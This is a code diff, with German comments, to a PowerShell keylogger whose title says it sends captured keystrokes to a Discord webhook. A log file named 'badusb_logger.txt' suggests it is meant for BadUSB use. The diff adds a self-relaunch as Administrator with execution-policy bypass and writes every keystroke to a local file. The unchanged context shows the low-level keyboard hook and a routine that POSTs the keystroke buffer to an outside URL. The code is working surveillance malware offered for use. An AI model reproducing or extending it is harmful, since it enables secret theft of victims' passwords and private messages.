@@ -1,10 +1,27 @@
 # PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (robuster für deutsches Layout)
+
+# Prüfe, ob als Administrator läuft
+function Test-Admin {
+    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+}
+
+if (-not (Test-Admin)) {
+    # Starte als Administrator neu
+    $scriptPath = $MyInvocation.MyCommand.Path
+    $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
+    Start-Process powershell -ArgumentList $arguments -Verb RunAs -Wait
+    exit
+}
+
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Diagnostics;
+using System.IO;
 
 public class KeyLogger
 {
@@ -43,12 +60,14 @@ public class KeyLogger
     private StringBuilder _buffer = new StringBuilder();
     private DateTime _lastSend = DateTime.Now;
     private string _hookUrl;
+    private string _logFile = "badusb_logger.txt";
 
     public KeyLogger(string hookUrl)
     {
         _hookUrl = hookUrl;
         _proc = HookCallback;
         _hookID = SetHook(_proc);
+        LogToFile("Hook gesetzt: " + (_hookID != IntPtr.Zero ? "Erfolgreich" : "Fehlgeschlagen"));
     }
 
     private IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -77,37 +96,41 @@ public class KeyLogger
             if (result > 0)
             {
                 _buffer.Append(sb.ToString());
+                LogToFile("Taste erfasst: " + sb.ToString());
             }
             else if (result == 0)
             {
                 // Für nicht-zeichenbasierte Keys, füge eine Beschreibung hinzu
+                string keyDesc = "";
                 switch (vkCode)
                 {
-                    case 0x08: _buffer.Append("[BACKSPACE]"); break;
-                    case 0x09: _buffer.Append("[TAB]"); break;
-                    case 0x0D: _buffer.Append("[ENTER]"); break;
-                    case 0x1B: _buffer.Append("[ESC]"); break;
-                    case 0x20: _buffer.Append(" "); break; // Leerzeichen
-                    case 0x25: _buffer.Append("[LEFT]"); break;
-                    case 0x26: _buffer.Append("[UP]"); break;
-                    case 0x27: _buffer.Append("[RIGHT]"); break;
-                    case 0x28: _buffer.Append("[DOWN]"); break;
-                    case 0x2D: _buffer.Append("[INSERT]"); break;
-                    case 0x2E: _buffer.Append("[DELETE]"); break;
-                    case 0x70: _buffer.Append("[F1]"); break;
-                    case 0x71: _buffer.Append("[F2]"); break;
-                    case 0x72: _buffer.Append("[F3]"); break;
-                    case 0x73: _buffer.Append("[F4]"); break;
-                    case 0x74: _buffer.Append("[F5]"); break;
-                    case 0x75: _buffer.Append("[F6]"); break;
-                    case 0x76: _buffer.Append("[F7]"); break;
-                    case 0x77: _buffer.Append("[F8]"); break;
-                    case 0x78: _buffer.Append("[F9]"); break;
-                    case 0x79: _buffer.Append("[F10]"); break;
-                    case 0x7A: _buffer.Append("[F11]"); break;
-                    case 0x7B: _buffer.Append("[F12]"); break;
-                    default: _buffer.Append($"[VK:{vkCode}]"); break;
+                    case 0x08: keyDesc = "[BACKSPACE]"; break;
+                    case 0x09: keyDesc = "[TAB]"; break;
+                    case 0x0D: keyDesc = "[ENTER]"; break;
+                    case 0x1B: keyDesc = "[ESC]"; break;
+                    case 0x20: keyDesc = " "; break; // Leerzeichen
+                    case 0x25: keyDesc = "[LEFT]"; break;
+                    case 0x26: keyDesc = "[UP]"; break;
+                    case 0x27: keyDesc = "[RIGHT]"; break;
+                    case 0x28: keyDesc = "[DOWN]"; break;
+                    case 0x2D: keyDesc = "[INSERT]"; break;
+                    case 0x2E: keyDesc = "[DELETE]"; break;
+                    case 0x70: keyDesc = "[F1]"; break;
+                    case 0x71: keyDesc = "[F2]"; break;
+                    case 0x72: keyDesc = "[F3]"; break;
+                    case 0x73: keyDesc = "[F4]"; break;
+                    case 0x74: keyDesc = "[F5]"; break;
+                    case 0x75: keyDesc = "[F6]"; break;
+                    case 0x76: keyDesc = "[F7]"; break;
+                    case 0x77: keyDesc = "[F8]"; break;
+                    case 0x78: keyDesc = "[F9]"; break;
+                    case 0x79: keyDesc = "[F10]"; break;
+                    case 0x7A: keyDesc = "[F11]"; break;
+                    case 0x7B: keyDesc = "[F12]"; break;
+                    default: keyDesc = $"[VK:{vkCode}]"; break;
                 }
+                _buffer.Append(keyDesc);
+                LogToFile("Spezielle Taste erfasst: " + keyDesc);
             }
         }
 
@@ -126,16 +149,27 @@ public class KeyLogger
                     string payload = $"{{\"content\":\"{_buffer.ToString().Replace("\"", "\\\"")}\"}}";
                     client.UploadString(_hookUrl, "POST", payload);
                 }
+                LogToFile("Buffer gesendet: " + _buffer.ToString());
                 _buffer.Clear();
                 _lastSend = DateTime.Now;
             }
-                        catch (Exception ex) { Console.WriteLine("SendBuffer Exception: " + ex.ToString()); }
+                        catch (Exception ex) { LogToFile("SendBuffer Exception: " + ex.ToString()); }
         }
     }
 
     public void Unhook()
     {
         UnhookWindowsHookEx(_hookID);
+        LogToFile("Hook entfernt");
+    }
+
+    private void LogToFile(string message)
+    {
+        try
+        {
+            File.AppendAllText(_logFile, DateTime.Now.ToString("o") + ": " + message + Environment.NewLine);
+        }
+        catch {}
     }
 }
 "@
@@ -159,7 +193,7 @@ $sendTimer = New-Object System.Timers.Timer
 $sendTimer.Interval = 500
 $sendTimer.AutoReset = $true
 $sendTimer.add_Elapsed({
-    lock    [System.Threading.Monitor]::Enter($sendBufferLock)
+    [System.Threading.Monitor]::Enter($sendBufferLock)
     try {
         $logger.SendBuffer()
     } finally {
